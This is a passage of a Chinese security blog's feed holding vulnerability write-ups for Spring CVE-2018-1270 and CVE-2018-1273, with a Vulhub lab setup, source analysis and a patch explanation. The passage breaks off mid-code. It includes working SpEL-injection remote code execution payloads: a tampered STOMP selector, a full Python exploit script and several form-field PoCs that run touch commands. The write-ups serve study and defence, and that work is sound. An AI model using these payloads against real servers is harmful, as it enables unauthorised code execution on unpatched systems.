      <category term="Spring" scheme="https://www.mi1k7ea.com/tags/Spring/"/>
    
      <category term="SpEL注入" scheme="https://www.mi1k7ea.com/tags/SpEL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>浅析Spring Messaging之CVE-2018-1270</title>
    <link href="https://www.mi1k7ea.com/2020/02/08/%E6%B5%85%E6%9E%90Spring-Messaging%E4%B9%8BCVE-2018-1270/"/>
    <id>https://www.mi1k7ea.com/2020/02/08/浅析Spring-Messaging之CVE-2018-1270/</id>
    <published>2020-02-08T04:13:22.000Z</published>
    <updated>2020-02-09T04:03:00.800Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-Spring-Messaging"><a href="#0x01-Spring-Messaging" class="headerlink" title="0x01 Spring Messaging"></a>0x01 Spring Messaging</h2><p>Spring Messaging模块为集成Messaging API和消息协议提供支持，包括base、converter、core、handler、simp、support、tcp等模块，其上层协议是STOMP，底层通信基于SockJS。</p><p> 几个模块简介如下：</p><p>base：定义了消息Message、消息处理MessageHandler、发送消息MessageChannel；Message由两部分组成，即Header和Payload；MessageHandler是一个处理消息的约定，Spring Messaging提供了丰富的消息处理方式；MessageChannel表现为pipes-and-filters架构的管道。</p><ul><li>converter：对消息转换提供支持。</li><li>core：提供消息的模板方法。</li><li>handler：处理模块。</li><li>simp：包含诸如STOMP协议的简单消息协议的通用支持。STOMP，Streaming Text Orientated Message Protocol，是流文本定向消息协议，是一种为MOM(Message Oriented Middleware，面向消息的中间件)设计的简单文本协议。它提供了一个可互操作的连接格式，允许STOMP客户端与任意STOMP消息代理(Broker)进行交互，类似于OpenWire(一种二进制协议)。由于其设计简单，很容易开发客户端，因此在多种语言和多种平台上得到广泛应用。其中最流行的STOMP消息代理是Apache ActiveMQ。</li><li>support：提供了Message的实现，及创建消息的MessageBuilder和获取消息头的MessageHeaderAccessor，还有各种不同的MessageChannel实现和channel interceptor支持。</li><li>tcp： 一方面提供了通过TcpOperations建立tcp connection、通过TcpConnectionHandler处理消息和通过TcpConnectionf发送消息的抽象及实现；另一方面包含了对基于Reactor的tcp 消息支持。</li></ul><h2 id="0x02-CVE-2018-1270"><a href="#0x02-CVE-2018-1270" class="headerlink" title="0x02 CVE-2018-1270"></a>0x02 CVE-2018-1270</h2><blockquote><p>Spring框架中通过spring-messaging模块来实现STOMP（Simple Text-Orientated Messaging Protocol），STOMP是一种封装WebSocket的简单消息协议。攻击者可以通过建立WebSocket连接并发送一条消息造成远程代码执行。</p></blockquote><p>具体地说，在Spring Messaging中，其允许客户端订阅消息，并使用selector过滤消息。其中selector用SpEL表达式编写，并使用StandardEvaluationContext解析，从而导致SpEL表达式注入漏洞。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><ul><li>Spring Framework 5.0 to 5.0.4  </li><li>Spring Framework 4.3 to 4.3.14</li><li>Older unsupported versions are also affected</li></ul><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>参考Vulhub：<a href="https://vulhub.org/#/environments/spring/CVE-2018-1270/" target="_blank" rel="noopener">https://vulhub.org/#/environments/spring/CVE-2018-1270/</a></p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="Method1"><a href="#Method1" class="headerlink" title="Method1"></a>Method1</h4><p>访问页面，打开F12看到存在app.js文件，其中connect()函数用于建立SockJS连接：</p><p><img src="/2020/02/08/浅析Spring-Messaging之CVE-2018-1270/1.png" alt=""></p><p>这里直接篡改app.js的内容，插入恶意selector代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> header  = &#123;<span class="string">"selector"</span>:<span class="string">"T(java.lang.Runtime).getRuntime().exec('touch /tmp/mi1k7ea')"</span>&#125;;</span><br><span class="line">    <span class="keyword">var</span> socket = <span class="keyword">new</span> SockJS(<span class="string">'/gs-guide-websocket'</span>);</span><br><span class="line">    stompClient = Stomp.over(socket);</span><br><span class="line">    stompClient.connect(&#123;&#125;, <span class="function"><span class="keyword">function</span> (<span class="params">frame</span>) </span>&#123;</span><br><span class="line">        setConnected(<span class="literal">true</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'Connected: '</span> + frame);</span><br><span class="line">        stompClient.subscribe(<span class="string">'/topic/greetings'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">greeting</span>) </span>&#123;</span><br><span class="line">            showGreeting(<span class="built_in">JSON</span>.parse(greeting.body).content);</span><br><span class="line">        &#125;,header);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/02/08/浅析Spring-Messaging之CVE-2018-1270/2.png" alt=""></p><p>此时在Web界面点击Connect再随便Send几个字符，就能成功触发漏洞：</p><p><img src="/2020/02/08/浅析Spring-Messaging之CVE-2018-1270/3.png" alt=""></p><h4 id="Method2"><a href="#Method2" class="headerlink" title="Method2"></a>Method2</h4><p>使用Burp抓包，点击Connect，拦截到如下WebSocket报文：</p><p><img src="/2020/02/08/浅析Spring-Messaging之CVE-2018-1270/4.png" alt=""></p><p>篡改报文内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&quot;SUBSCRIBE\nid:sub-0\ndestination:/topic/greetings\nselector:T(java.lang.Runtime).getRuntime().exec(&apos;touch /tmp/mi1k7ea&apos;)\n\n\u0000&quot;]</span><br></pre></td></tr></table></figure><p><img src="/2020/02/08/浅析Spring-Messaging之CVE-2018-1270/5.png" alt=""></p><p>再随便输入内容Send，然后就能触发了。</p><h4 id="Method3"><a href="#Method3" class="headerlink" title="Method3"></a>Method3</h4><p>使用P神的脚本就好：<a href="https://github.com/vulhub/vulhub/blob/master/spring/CVE-2018-1270/exploit.py" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/spring/CVE-2018-1270/exploit.py</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">logging.basicConfig(stream=sys.stdout, level=logging.INFO)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random_str</span><span class="params">(length)</span>:</span></span><br><span class="line">    letters = string.ascii_lowercase + string.digits</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(random.choice(letters) <span class="keyword">for</span> c <span class="keyword">in</span> range(length))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SockJS</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, url, *args, **kwargs)</span>:</span></span><br><span class="line">        super().__init__(*args, **kwargs)</span><br><span class="line">        self.base = <span class="string">f'<span class="subst">&#123;url&#125;</span>/<span class="subst">&#123;random.randint(<span class="number">0</span>, <span class="number">1000</span>)&#125;</span>/<span class="subst">&#123;random_str(<span class="number">8</span>)&#125;</span>'</span></span><br><span class="line">        self.daemon = <span class="keyword">True</span></span><br><span class="line">        self.session = requests.session()</span><br><span class="line">        self.session.headers = &#123;</span><br><span class="line">            <span class="string">'Referer'</span>: url,</span><br><span class="line">            <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)'</span></span><br><span class="line">        &#125;</span><br><span class="line">        self.t = int(time.time()*<span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        url = <span class="string">f'<span class="subst">&#123;self.base&#125;</span>/htmlfile?c=_jp.vulhub'</span></span><br><span class="line">        response = self.session.get(url, stream=<span class="keyword">True</span>)</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> response.iter_lines():</span><br><span class="line">            time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">(self, command, headers, body=<span class="string">''</span>)</span>:</span></span><br><span class="line">        data = [command.upper(), <span class="string">'\n'</span>]</span><br><span class="line"></span><br><span class="line">        data.append(<span class="string">'\n'</span>.join([<span class="string">f'<span class="subst">&#123;k&#125;</span>:<span class="subst">&#123;v&#125;</span>'</span> <span class="keyword">for</span> k, v <span class="keyword">in</span> headers.items()]))</span><br><span class="line">        </span><br><span class="line">        data.append(<span class="string">'\n\n'</span>)</span><br><span class="line">        data.append(body)</span><br><span class="line">        data.append(<span class="string">'\x00'</span>)</span><br><span class="line">        data = json.dumps([<span class="string">''</span>.join(data)])</span><br><span class="line"></span><br><span class="line">        response = self.session.post(<span class="string">f'<span class="subst">&#123;self.base&#125;</span>/xhr_send?t=<span class="subst">&#123;self.t&#125;</span>'</span>, data=data)</span><br><span class="line">        <span class="keyword">if</span> response.status_code != <span class="number">204</span>:</span><br><span class="line">            logging.info(<span class="string">f"send '<span class="subst">&#123;command&#125;</span>' data error."</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            logging.info(<span class="string">f"send '<span class="subst">&#123;command&#125;</span>' data success."</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__del__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.session.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sockjs = SockJS(<span class="string">'http://your-ip:8080/gs-guide-websocket'</span>)</span><br><span class="line">sockjs.start()</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sockjs.send(<span class="string">'connect'</span>, &#123;</span><br><span class="line">    <span class="string">'accept-version'</span>: <span class="string">'1.1,1.0'</span>,</span><br><span class="line">    <span class="string">'heart-beat'</span>: <span class="string">'10000,10000'</span></span><br><span class="line">&#125;)</span><br><span class="line">sockjs.send(<span class="string">'subscribe'</span>, &#123;</span><br><span class="line">    <span class="string">'selector'</span>: <span class="string">"T(java.lang.Runtime).getRuntime().exec('touch /tmp/mi1k7ea')"</span>,</span><br><span class="line">    <span class="string">'id'</span>: <span class="string">'sub-0'</span>,</span><br><span class="line">    <span class="string">'destination'</span>: <span class="string">'/topic/greetings'</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">data = json.dumps(&#123;<span class="string">'name'</span>: <span class="string">'vulhub'</span>&#125;)</span><br><span class="line">sockjs.send(<span class="string">'send'</span>, &#123;</span><br><span class="line">    <span class="string">'content-length'</span>: len(data),</span><br><span class="line">    <span class="string">'destination'</span>: <span class="string">'/app/hello'</span></span><br><span class="line">&#125;, data)</span><br></pre></td></tr></table></figure><p>要在Python3环境下才能运行：</p><p><img src="/2020/02/08/浅析Spring-Messaging之CVE-2018-1270/6.png" alt=""></p><p>之后到服务端就看到命令被成功执行了。</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>有个注意的地方，如P神说的：</p><blockquote><p>网上大部分文章都说spring messaging是基于websocket通信，其实不然。spring messaging是基于sockjs（可以理解为一个通信协议），而sockjs适配多种浏览器：现代浏览器中使用websocket通信，老式浏览器中使用ajax通信。</p><p>连接后端服务器的流程，可以理解为：</p><ol><li>用<a href="http://jmesnil.net/stomp-websocket/doc/" target="_blank" rel="noopener">STOMP协议</a>将数据组合成一个文本流</li><li>用<a href="https://github.com/sockjs/sockjs-client" target="_blank" rel="noopener">sockjs协议</a>发送文本流，sockjs会选择一个合适的通道：websocket或xhr(http)，与后端通信</li></ol></blockquote><p>这里就不具体调试分析了，只简单分析下漏洞点，具体的调试分析可参考网上的一些文档即可。</p><p>从补丁的文件开始分析，即spring-messaging/src/main/java/org/springframework/messaging/simp/broker/DefaultSubscriptionRegistry.java，关键在于addSubscriptionInternal()函数，这里对header参数进行了接收和处理，其中会获取header中的selector，当selector不为空时则设置到expression中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">addSubscriptionInternal</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">String sessionId, String subsId, String destination, Message&lt;?&gt; message)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">Expression expression = <span class="keyword">null</span>;</span><br><span class="line">MessageHeaders headers = message.getHeaders();</span><br><span class="line">String selector = SimpMessageHeaderAccessor.getFirstNativeHeader(getSelectorHeaderName(), headers);</span><br><span class="line"><span class="keyword">if</span> (selector != <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">expression = <span class="keyword">this</span>.expressionParser.parseExpression(selector);</span><br><span class="line"><span class="keyword">this</span>.selectorHeaderInUse = <span class="keyword">true</span>;</span><br><span class="line"><span class="keyword">if</span> (logger.isTraceEnabled()) &#123;</span><br><span class="line">logger.trace(<span class="string">"Subscription selector: ["</span> + selector + <span class="string">"]"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line"><span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">logger.debug(<span class="string">"Failed to parse selector: "</span> + selector, ex);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">this</span>.subscriptionRegistry.addSubscription(sessionId, subsId, destination, expression);</span><br><span class="line"><span class="keyword">this</span>.destinationCache.updateAfterNewSubscription(destination, sessionId, subsId);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>通过<code>sessionId</code>和<code>subsId</code>确定一个<code>selector</code>属性，后续服务端就通过这个<code>subsId</code>来查找特定会话，也就是从<code>headers</code>头部信息查找<code>selector</code>，由<code>selector</code>的值作为expression被执行</p></blockquote><p>前面这是Subscribe操作时设置的selector，我们知道漏洞的触发是在Send之后，接着看下Send之后的函数调用。</p><p>看到org\springframework\messaging\simp\broker\SimpleBrokerMessageHandler.java，其中有个sendMessageToSubscribers()函数，即将我们要发送的数据发送给订阅者，其中参数message保存了此次连接的相关信息，message的头部信息包含了selector的属性，调用了findSubscriptions()函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">sendMessageToSubscribers</span><span class="params">(@Nullable String destination, Message&lt;?&gt; message)</span> </span>&#123;</span><br><span class="line">MultiValueMap&lt;String,String&gt; subscriptions = <span class="keyword">this</span>.subscriptionRegistry.findSubscriptions(message);</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们跟进查看findSubscriptions()函数，位于org/springframework/messaging/simp/broker/AbstractSubscriptionRegistry.java中，这里将message传进来findSubscriptionsInternal()函数中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> MultiValueMap&lt;String, String&gt; <span class="title">findSubscriptions</span><span class="params">(Message&lt;?&gt; message)</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">return</span> findSubscriptionsInternal(destination, message);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进findSubscriptionsInternal()函数，位于org\springframework\messaging\simp\broker\DefaultSubscriptionRegistry.java中，这里将message传入了filterSubscriptions()函数进行处理：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> MultiValueMap&lt;String, String&gt; <span class="title">findSubscriptionsInternal</span><span class="params">(String destination, Message&lt;?&gt; message)</span> </span>&#123;</span><br><span class="line">MultiValueMap&lt;String, String&gt; result = <span class="keyword">this</span>.destinationCache.getSubscriptions(destination, message);</span><br><span class="line"><span class="keyword">return</span> filterSubscriptions(result, message);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进filterSubscriptions()函数，同样在DefaultSubscriptionRegistry.java中定义了，该函数获取前面配置的selector来对subscriptions进行过滤选择，如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> MultiValueMap&lt;String, String&gt; <span class="title">filterSubscriptions</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">MultiValueMap&lt;String, String&gt; allMatches, Message&lt;?&gt; message)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">this</span>.selectorHeaderInUse) &#123;</span><br><span class="line"><span class="keyword">return</span> allMatches;</span><br><span class="line">&#125;</span><br><span class="line">EvaluationContext context = <span class="keyword">null</span>;</span><br><span class="line">MultiValueMap&lt;String, String&gt; result = <span class="keyword">new</span> LinkedMultiValueMap&lt;&gt;(allMatches.size());</span><br><span class="line"><span class="keyword">for</span> (String sessionId : allMatches.keySet()) &#123;</span><br><span class="line"><span class="keyword">for</span> (String subId : allMatches.get(sessionId)) &#123;</span><br><span class="line">SessionSubscriptionInfo info = <span class="keyword">this</span>.subscriptionRegistry.getSubscriptions(sessionId);</span><br><span class="line"><span class="keyword">if</span> (info == <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">Subscription sub = info.getSubscription(subId);</span><br><span class="line"><span class="keyword">if</span> (sub == <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">Expression expression = sub.getSelectorExpression();</span><br><span class="line"><span class="keyword">if</span> (expression == <span class="keyword">null</span>) &#123;</span><br><span class="line">result.add(sessionId, subId);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (context == <span class="keyword">null</span>) &#123;</span><br><span class="line">context = <span class="keyword">new</span> StandardEvaluationContext(message);</span><br><span class="line">context.getPropertyAccessors().add(<span class="keyword">new</span> SimpMessageHeaderPropertyAccessor());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (Boolean.TRUE.equals(expression.getValue(context, Boolean.class))) &#123;</span><br><span class="line">result.add(sessionId, subId);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (SpelEvaluationException ex) &#123;</span><br><span class="line"><span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">logger.debug(<span class="string">"Failed to evaluate selector: "</span> + ex.getMessage());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">logger.debug(<span class="string">"Failed to evaluate selector"</span>, ex);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析得知，通过<code>Expression expression = sub.getSelectorExpression();</code>来获取前面订阅时设置的Selector表达式，然后在<code>if (Boolean.TRUE.equals(expression.getValue(context, Boolean.class)))</code>代码中调用了expression.getValue()函数，这就是漏洞触发点，成功触发了SpEL表达式注入漏洞。</p><h3 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h3><p>官方补丁：<a href="https://github.com/spring-projects/spring-framework/commit/e0de9126ed8cf25cf141d3e66420da94e350708a#diff-ca84ec52e20ebb2a3732c6c15f37d37a" target="_blank" rel="noopener">https://github.com/spring-projects/spring-framework/commit/e0de9126ed8cf25cf141d3e66420da94e350708a#diff-ca84ec52e20ebb2a3732c6c15f37d37a</a></p><p>可以看到主要是修改了DefaultSubscriptionRegistry这个类，用SimpleEvaluationContext来替代了StandardEvaluationContext，也就是采用了SpEL表达式注入漏洞的通用防御方法。</p><h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a href="https://www.cnblogs.com/davidwang456/p/4446796.html" target="_blank" rel="noopener">spring源码分析之spring-messaging模块详解</a></p><p><a href="https://www.meetsec.cn/index.php/archives/43/" target="_blank" rel="noopener">IDEA动态调试分析Spring RCE CVE-2018-1270</a></p><p><a href="https://xz.aliyun.com/t/2252" target="_blank" rel="noopener">spring-messaging Remote Code Execution 分析-【CVE-2018-1270】</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
      <category term="Spring" scheme="https://www.mi1k7ea.com/categories/Java/Spring/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="Spring" scheme="https://www.mi1k7ea.com/tags/Spring/"/>
    
      <category term="SpEL注入" scheme="https://www.mi1k7ea.com/tags/SpEL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>浅析Spring Data Commons之CVE-2018-1273</title>
    <link href="https://www.mi1k7ea.com/2020/02/03/%E6%B5%85%E6%9E%90Spring-Data-Commons%E4%B9%8BCVE-2018-1273/"/>
    <id>https://www.mi1k7ea.com/2020/02/03/浅析Spring-Data-Commons之CVE-2018-1273/</id>
    <published>2020-02-03T13:11:16.000Z</published>
    <updated>2020-02-03T15:55:47.459Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-Spring-Data-Commons"><a href="#0x01-Spring-Data-Commons" class="headerlink" title="0x01 Spring Data Commons"></a>0x01 Spring Data Commons</h2><p>Spring Data是一个用于简化数据库访问，并支持云服务的开源框架，其主要目标是使数据库的访问变得方便快捷。</p><p>Spring Data Commons是Spring Data下所有子项目共享的基础框架。</p><h2 id="0x02-CVE-2018-1273"><a href="#0x02-CVE-2018-1273" class="headerlink" title="0x02 CVE-2018-1273"></a>0x02 CVE-2018-1273</h2><p>Spring Data Commons在2.0.5及以前版本中，存在一处SpEL表达式注入漏洞，攻击者可以注入恶意SpEL表达式以执行任意命令。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><ul><li>2.0.x users should upgrade to 2.0.6</li><li>1.13.x users should upgrade to 1.13.11</li><li>Older versions should upgrade to a supported branch</li></ul><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>直接用Vulhub的即可：<a href="https://vulhub.org/#/environments/spring/CVE-2018-1273/" target="_blank" rel="noopener">https://vulhub.org/#/environments/spring/CVE-2018-1273/</a></p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>访问目标站点/users接口，是个提交用户名和密码的注册用户的表单，且会在页面中显示出来：</p><p><img src="/2020/02/03/浅析Spring-Data-Commons之CVE-2018-1273/1.png" alt=""></p><p>提交该表单是如下POST请求：</p><p><img src="/2020/02/03/浅析Spring-Data-Commons之CVE-2018-1273/2.png" alt=""></p><p>将POST的内容修改为如下PoC再次发送：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;touch /tmp/mi1k7ea&quot;)]=&amp;password=&amp;repeatedPassword=</span><br></pre></td></tr></table></figure><p><img src="/2020/02/03/浅析Spring-Data-Commons之CVE-2018-1273/3.png" alt=""></p><p>此时服务端执行了恶意命令，文件创建成功：</p><p><img src="/2020/02/03/浅析Spring-Data-Commons之CVE-2018-1273/4.png" alt=""></p><p><strong>其他一些可用的PoC</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 使用JavaScript引擎绕过</span><br><span class="line">username[#this.getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;js&quot;).eval(&quot;java.lang.Runtime.getRuntime().exec(&apos;touch /tmp/hacked&apos;)&quot;)]=&amp;password=&amp;repeatedPassword=</span><br><span class="line"></span><br><span class="line">// 使用ProcessBuilder</span><br><span class="line">username[(#root.getClass().forName(&quot;java.lang.ProcessBuilder&quot;).getConstructor(&apos;foo&apos;.split(&apos;&apos;).getClass()).newInstance(&apos;touchxx/tmp/niubi&apos;.split(&apos;xx&apos;))).start()]=&amp;password=&amp;repeatedPassword=</span><br></pre></td></tr></table></figure><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>先来看下漏洞点，下载Spring Data Commons 2.0.5的源码分析。</p><p> 漏洞代码位于org.springframework.data.web.MapDataBinder类中的setPropertyValue()函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 